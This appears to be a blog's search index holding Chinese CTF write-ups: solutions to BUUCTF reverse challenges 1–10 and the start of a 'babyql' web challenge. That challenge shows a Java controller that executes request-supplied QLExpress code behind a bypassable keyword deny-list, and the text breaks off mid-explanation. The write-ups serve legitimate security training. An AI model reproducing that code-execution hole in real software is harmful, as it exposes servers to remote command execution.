<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>BUUCTF Reverse 1-10</title>
      <link href="/2022/11/23/BUUCTF-Reverse-1-10/"/>
      <url>/2022/11/23/BUUCTF-Reverse-1-10/</url>
      
        <content type="html"><![CDATA[<h1 id="BUUCTF-Reverse-1-10"><a href="#BUUCTF-Reverse-1-10" class="headerlink" title="BUUCTF Reverse 1-10"></a>BUUCTF Reverse 1-10</h1><p>[toc]</p><h2 id="1-easyre"><a href="#1-easyre" class="headerlink" title="1. easyre"></a>1. easyre</h2><p>64位程序，没有加壳</p><p>使用64位ida，shift+f12检索字符串，得flag</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221118221619560.png" alt="image-20221118221619560"></p><h2 id="2-reverse1"><a href="#2-reverse1" class="headerlink" title="2. reverse1"></a>2. reverse1</h2><p>64位程序</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221118223514705.png" alt="image-20221118223514705"></p><p>丢入ida，shift+f12查看字符串</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221118224543123.png" alt="image-20221118224543123"></p><p>双击，发现被sub_1400118C0调用</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221118224558299.png" alt="image-20221118224558299"></p><p>str2为<code>&#123;hello_world&#125;</code></p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221118224626103.png" alt="image-20221118224626103"></p><p>转为伪代码，判断输入的字符串和str2相等即可</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221118224708634.png" alt="image-20221118224708634"></p><p>str2是对<code>&#123;hello_world&#125;</code>进行字符串替换得到的，<code>o替换为0</code></p><p>最后的flag:{hell0_w0rld}</p><h2 id="3-reverse2"><a href="#3-reverse2" class="headerlink" title="3. reverse2"></a>3. reverse2</h2><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221118225059918.png" alt="image-20221118225059918"></p><p>ida64打开，check+f12查看字符串，跟进<code>right flag</code></p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221118225601389.png" alt="image-20221118225601389"></p><p>main函数调用，跟进</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221118225631294.png" alt="image-20221118225631294"></p><p>和上一个题目差不多，查看s2的生成过程，将flag中的i和r替换为1</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="built_in">strlen</span>(&amp;flag); ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( *(&amp;flag + i) == <span class="string">&#x27;i&#x27;</span> || *(&amp;flag + i) == <span class="string">&#x27;r&#x27;</span> )</span><br><span class="line">        *(&amp;flag + i) = <span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>flag为{hacking_for_fun}</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221118225735932.png" alt="image-20221118225735932"></p><p>那么最后的flag为<code>flag&#123;hack1ng_fo1_fun&#125;</code></p><h2 id="4-内涵的软件"><a href="#4-内涵的软件" class="headerlink" title="4. 内涵的软件"></a>4. 内涵的软件</h2><p>32位</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221118225857209.png" alt="image-20221118225857209"></p><p>ida32打开，将DBAPP修改为flag提交</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221118230121326.png" alt="image-20221118230121326"></p><h2 id="5-新年快乐"><a href="#5-新年快乐" class="headerlink" title="5. 新年快乐"></a>5. 新年快乐</h2><p>32位，UPX加壳</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221118230249938.png" alt="image-20221118230249938"></p><p>手动脱壳</p><p>查看xdbg的断点</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221119102612074.png" alt="image-20221119102612074"></p><p>根据ESP定律找OEP(Original Entry Point)，程序的入口点</p><p>F9运行到这里，<code>往上可以看到一个popad的指令，该指令将寄存器的值进行还原。找到下面一个jmp指令所要跳转的位置，就是程序的OEP</code></p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221119113042857.png" alt="image-20221119113042857"></p><p>F8</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221119113216349.png" alt="image-20221119113216349"></p><p>dump下来，使用Scylla插件</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221119113404315.png" alt="image-20221119113404315"></p><p>第一步，生成dump.exe</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221119113437195.png" alt="image-20221119113437195"></p><p>第二步，进行修复</p><p>Misc–&gt;options</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221119113601965.png" alt="image-20221119113601965"></p><p>然后点击IAT Autosearch，点击Get Imports，而后fix dump</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221119113659179.png" alt="image-20221119113659179"></p><p>生成dump_SCY.exe</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221119113727179.png" alt="image-20221119113727179"></p><p>丢入ida，修复之后的文件</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221119112329498.png" alt="image-20221119112329498"></p><p>进行一个字符串比较，最后的flag为flag{HappyNewYear!}</p><h2 id="6-xor"><a href="#6-xor" class="headerlink" title="6. xor"></a>6. xor</h2><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221119163159094.png" alt="image-20221119163159094"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 将字符串分割为单个字符</span></span><br><span class="line">string = [<span class="string">&#x27;f&#x27;</span>,<span class="number">0x0A</span>,<span class="string">&#x27;k&#x27;</span>,<span class="number">0x0C</span>,<span class="string">&#x27;w&#x27;</span>,<span class="string">&#x27;&amp;&#x27;</span>,<span class="string">&#x27;O&#x27;</span>,<span class="string">&#x27;.&#x27;</span>,<span class="string">&#x27;@&#x27;</span>,<span class="number">0x11</span>,<span class="string">&#x27;x&#x27;</span>,<span class="number">0x0D</span>,<span class="string">&#x27;Z&#x27;</span>,<span class="string">&#x27;;&#x27;</span>,<span class="string">&#x27;U&#x27;</span>,<span class="number">0x11</span>,<span class="string">&#x27;p&#x27;</span>,<span class="number">0x19</span>,<span class="string">&#x27;F&#x27;</span>,<span class="number">0x1F</span>,<span class="string">&#x27;v&#x27;</span>,<span class="string">&#x27;&quot;&#x27;</span>,<span class="string">&#x27;M&#x27;</span>,<span class="string">&#x27;#&#x27;</span>,<span class="string">&#x27;D&#x27;</span>,<span class="number">0x0E</span>,<span class="string">&#x27;g&#x27;</span>,<span class="number">0x6</span>,<span class="string">&#x27;h&#x27;</span>,<span class="number">0x0F</span>,<span class="string">&#x27;G&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;O&#x27;</span>,<span class="number">0x0</span>]</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;f&#x27;</span></span><br><span class="line"><span class="comment"># 转字符串</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> (<span class="built_in">range</span>(<span class="built_in">len</span>(string))):</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">type</span>(string[i]) == <span class="built_in">int</span>):</span><br><span class="line">        string[i] = <span class="built_in">chr</span>(string[i])</span><br><span class="line"><span class="built_in">print</span>(string)</span><br><span class="line"><span class="comment"># 异或</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="built_in">len</span>(string)):</span><br><span class="line">    flag += <span class="built_in">chr</span>(<span class="built_in">ord</span>(string[i])^<span class="built_in">ord</span>(string[i-<span class="number">1</span>]))</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221119163056735.png" alt="image-20221119163056735"></p><h2 id="7-helloword"><a href="#7-helloword" class="headerlink" title="7. helloword"></a>7. helloword</h2><p>apk文件，使用jadx打开</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221119163841163.png" alt="image-20221119163841163"></p><p>或者丢入ida，使用APK Android打开</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221119163939686.png" alt="image-20221119163939686"></p><p>shift+f12查看字符串</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221119164048373.png" alt="image-20221119164048373"></p><h2 id="8-reverse3"><a href="#8-reverse3" class="headerlink" title="8. reverse3"></a>8. reverse3</h2><p>32位</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221119164218026.png" alt="image-20221119164218026"></p><p>main函数，对输入的字符串调用sub_4110BE进行处理，然后进行<code>移位处理</code></p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221119172736607.png" alt="image-20221119172736607"></p><p>跟进sub_4110BE，跟进sub_411AB0</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> ( v11 &gt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    byte_41A144[<span class="number">2</span>] = <span class="number">0</span>;</span><br><span class="line">    byte_41A144[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">    byte_41A144[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">3</span> &amp;&amp; v11 &gt;= <span class="number">1</span>; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      byte_41A144[i] = *v13;</span><br><span class="line">      --v11;</span><br><span class="line">      ++v13;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( !i )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">switch</span> ( i )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        *((_BYTE *)v12 + v4) = aAbcdefghijklmn[(<span class="type">int</span>)(<span class="type">unsigned</span> __int8)byte_41A144[<span class="number">0</span>] &gt;&gt; <span class="number">2</span>];</span><br><span class="line">        v5 = v4 + <span class="number">1</span>;</span><br><span class="line">        *((_BYTE *)v12 + v5) = aAbcdefghijklmn[((byte_41A144[<span class="number">1</span>] &amp; <span class="number">0xF0</span>) &gt;&gt; <span class="number">4</span>) | (<span class="number">16</span> * (byte_41A144[<span class="number">0</span>] &amp; <span class="number">3</span>))];</span><br><span class="line">        *((_BYTE *)v12 + ++v5) = aAbcdefghijklmn[<span class="number">64</span>];</span><br><span class="line">        *((_BYTE *)v12 + ++v5) = aAbcdefghijklmn[<span class="number">64</span>];</span><br><span class="line">        v4 = v5 + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        *((_BYTE *)v12 + v4) = aAbcdefghijklmn[(<span class="type">int</span>)(<span class="type">unsigned</span> __int8)byte_41A144[<span class="number">0</span>] &gt;&gt; <span class="number">2</span>];</span><br><span class="line">        v6 = v4 + <span class="number">1</span>;</span><br><span class="line">        *((_BYTE *)v12 + v6) = aAbcdefghijklmn[((byte_41A144[<span class="number">1</span>] &amp; <span class="number">0xF0</span>) &gt;&gt; <span class="number">4</span>) | (<span class="number">16</span> * (byte_41A144[<span class="number">0</span>] &amp; <span class="number">3</span>))];</span><br><span class="line">        *((_BYTE *)v12 + ++v6) = aAbcdefghijklmn[((byte_41A144[<span class="number">2</span>] &amp; <span class="number">0xC0</span>) &gt;&gt; <span class="number">6</span>) | (<span class="number">4</span> * (byte_41A144[<span class="number">1</span>] &amp; <span class="number">0xF</span>))];</span><br><span class="line">        *((_BYTE *)v12 + ++v6) = aAbcdefghijklmn[<span class="number">64</span>];</span><br><span class="line">        v4 = v6 + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        *((_BYTE *)v12 + v4) = aAbcdefghijklmn[(<span class="type">int</span>)(<span class="type">unsigned</span> __int8)byte_41A144[<span class="number">0</span>] &gt;&gt; <span class="number">2</span>];</span><br><span class="line">        v7 = v4 + <span class="number">1</span>;</span><br><span class="line">        *((_BYTE *)v12 + v7) = aAbcdefghijklmn[((byte_41A144[<span class="number">1</span>] &amp; <span class="number">0xF0</span>) &gt;&gt; <span class="number">4</span>) | (<span class="number">16</span> * (byte_41A144[<span class="number">0</span>] &amp; <span class="number">3</span>))];</span><br><span class="line">        *((_BYTE *)v12 + ++v7) = aAbcdefghijklmn[((byte_41A144[<span class="number">2</span>] &amp; <span class="number">0xC0</span>) &gt;&gt; <span class="number">6</span>) | (<span class="number">4</span> * (byte_41A144[<span class="number">1</span>] &amp; <span class="number">0xF</span>))];</span><br><span class="line">        *((_BYTE *)v12 + ++v7) = aAbcdefghijklmn[byte_41A144[<span class="number">2</span>] &amp; <span class="number">0x3F</span>];</span><br><span class="line">        v4 = v7 + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  *((_BYTE *)v12 + v4) = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> v12;</span><br></pre></td></tr></table></figure><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221119172905225.png" alt="image-20221119172905225"></p><p>base64编码，3位变4位</p><p>所以先逆向移位，然后base64解码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">str2 = <span class="string">&#x27;e3nifIH9b_C@n@dH&#x27;</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(str2)):</span><br><span class="line">    <span class="comment"># print(i)</span></span><br><span class="line">    flag += <span class="built_in">chr</span>(<span class="built_in">ord</span>(str2[i])-i)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="built_in">print</span>(base64.b64decode(flag))</span><br></pre></td></tr></table></figure><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221119173030796.png" alt="image-20221119173030796"></p><h2 id="9-不一样的flag"><a href="#9-不一样的flag" class="headerlink" title="9. 不一样的flag"></a>9. 不一样的flag</h2><p>32位</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221119173207289.png" alt="image-20221119173207289"></p><p>shift+f12查看字符串</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221121193738324.png" alt="image-20221121193738324"></p><p>主逻辑在main函数中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"> __main();</span><br><span class="line">  v3[<span class="number">26</span>] = <span class="number">0</span>;</span><br><span class="line">  *(_WORD *)&amp;v3[<span class="number">27</span>] = <span class="number">0</span>;</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">strcpy</span>(v3, <span class="string">&quot;*11110100001010000101111#&quot;</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;you can choose one action to execute&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;1 up&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;2 down&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;3 left&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;4 right\n:&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;v5);</span><br><span class="line">    <span class="keyword">if</span> ( v5 == <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      ++*(_DWORD *)&amp;v3[<span class="number">25</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( v5 &gt; <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v5 == <span class="number">3</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        --v4;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( v5 != <span class="number">4</span> )</span><br><span class="line">LABEL_13:</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">        ++v4;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v5 != <span class="number">1</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_13;</span><br><span class="line">      --*(_DWORD *)&amp;v3[<span class="number">25</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">1</span>; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( *(<span class="type">int</span> *)&amp;v3[<span class="number">4</span> * i + <span class="number">25</span>] &lt; <span class="number">0</span> || *(<span class="type">int</span> *)&amp;v3[<span class="number">4</span> * i + <span class="number">25</span>] &gt; <span class="number">4</span> )</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v7[<span class="number">5</span> * *(_DWORD *)&amp;v3[<span class="number">25</span>] - <span class="number">41</span> + v4] == <span class="string">&#x27;1&#x27;</span> )</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v7[<span class="number">5</span> * *(_DWORD *)&amp;v3[<span class="number">25</span>] - <span class="number">41</span> + v4] == <span class="string">&#x27;#&#x27;</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;\nok, the order you enter is the flag!&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>上面的<code>*11110100001010000101111#</code>是迷宫的地图</p><p>对v4的操作相当于迷宫中的左移和右移</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221121193958206.png" alt="image-20221121193958206"></p><p>而对<code>(_DWORD *)&amp;v3[25]</code>的操作相当于上移和下移，而<code>*5</code>表示是5行</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221121194022644.png" alt="image-20221121194022644"></p><p>迷宫地图为</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">*<span class="number">1111</span></span><br><span class="line"><span class="number">01000</span></span><br><span class="line"><span class="number">01010</span></span><br><span class="line"><span class="number">00010</span></span><br><span class="line"><span class="number">1111</span>#</span><br></pre></td></tr></table></figure><p>走到<code>#</code>成功，这个过程中不能走到<code>1</code></p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221121193809020.png" alt="image-20221121193809020"></p><p>所以应该是<code>下下下右右上上右右下下下</code>，也就是<code>222441144222</code></p><h2 id="10-SimpleRev"><a href="#10-SimpleRev" class="headerlink" title="10. SimpleRev"></a>10. SimpleRev</h2><p>64位</p><p>小端序和大端序问题</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221123202910817.png" alt="image-20221123202910817"></p><blockquote><p>可以看到这里的两个十六进制是大端序，但是数据在内存中都是小端序，所以要将其，反转一下。一般在CPU，x86都是小端序，但是IDA将之转换为了大端序</p></blockquote><p>主要逻辑</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221123203009784.png" alt="image-20221123203009784"></p><p>从65到91爆破一下</p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">text = <span class="string">&#x27;killshadow&#x27;</span></span><br><span class="line">key = <span class="string">&#x27;ADSFKNDCLS&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(key.lower())</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">10</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">65</span>,<span class="number">91</span>):</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>((((j - <span class="number">39</span> - <span class="built_in">ord</span>(key.lower()[i]) + <span class="number">97</span>)%<span class="number">26</span>)+<span class="number">97</span>) == <span class="built_in">ord</span>(text[i])):</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">chr</span>(j))</span><br><span class="line">            flag += <span class="built_in">chr</span>(j)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Reverse </category>
          
      </categories>
      
      
        <tags>
            
            <tag> BUUCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>华为杯第一届中国研究生网络安全创新大赛实网对抗赛初赛</title>
      <link href="/2022/11/18/%E5%8D%8E%E4%B8%BA%E6%9D%AF%E7%AC%AC%E4%B8%80%E5%B1%8A%E4%B8%AD%E5%9B%BD%E7%A0%94%E7%A9%B6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%9B%E6%96%B0%E5%A4%A7%E8%B5%9B%E5%AE%9E%E7%BD%91%E5%AF%B9%E6%8A%97%E8%B5%9B%E5%88%9D%E8%B5%9B/"/>
      <url>/2022/11/18/%E5%8D%8E%E4%B8%BA%E6%9D%AF%E7%AC%AC%E4%B8%80%E5%B1%8A%E4%B8%AD%E5%9B%BD%E7%A0%94%E7%A9%B6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%9B%E6%96%B0%E5%A4%A7%E8%B5%9B%E5%AE%9E%E7%BD%91%E5%AF%B9%E6%8A%97%E8%B5%9B%E5%88%9D%E8%B5%9B/</url>
      
        <content type="html"><![CDATA[<h1 id="“华为杯”第一届中国研究生网络安全创新大赛实网对抗赛初赛"><a href="#“华为杯”第一届中国研究生网络安全创新大赛实网对抗赛初赛" class="headerlink" title="“华为杯”第一届中国研究生网络安全创新大赛实网对抗赛初赛"></a>“华为杯”第一届中国研究生网络安全创新大赛实网对抗赛初赛</h1><h2 id="babyql"><a href="#babyql" class="headerlink" title="babyql"></a>babyql</h2><p>关键的代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="comment">/* loaded from: BabyQL.jar:BOOT-INF/classes/com/ctf/web/ql/controller/AppController.class */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AppController</span> &#123;</span><br><span class="line">    <span class="meta">@RequestMapping(&#123;&quot;/&quot;&#125;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">index</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Welcome :)&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@RequestMapping(&#123;&quot;/exp&quot;&#125;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">exp</span><span class="params">(<span class="meta">@RequestBody</span> Map params)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">x</span> <span class="operator">=</span> params.get(<span class="string">&quot;x&quot;</span>).toString();</span><br><span class="line">        <span class="keyword">if</span> (x.hashCode() != <span class="string">&quot;guanzhujiarandundunjiechan&quot;</span>.hashCode() || x.equals(<span class="string">&quot;guanzhujiarandundunjiechan&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;guanzhujiarandundunjiechan&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> params.get(<span class="string">&quot;cmd&quot;</span>).toString();</span><br><span class="line">        <span class="type">Pattern</span> <span class="variable">pattern</span> <span class="operator">=</span> Pattern.compile(<span class="string">&quot;process|runtime|javascript|\\+|char|\\\\|from|\\[|\\]|load&quot;</span>, <span class="number">2</span>);</span><br><span class="line">        <span class="keyword">if</span> (pattern.matcher(cmd).find()) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;nonono&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">ExpressRunner</span> <span class="variable">runner</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ExpressRunner</span>();</span><br><span class="line">        DefaultContext&lt;String, Object&gt; context = <span class="keyword">new</span> <span class="title class_">DefaultContext</span>&lt;&gt;();</span><br><span class="line">        runner.execute(cmd, context, <span class="literal">null</span>, <span class="literal">true</span>, <span class="literal">false</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;hack me&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先是关于hashcode的小知识</p><p>满足<code>(x1-x2)*31=(y2-y1)</code></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span 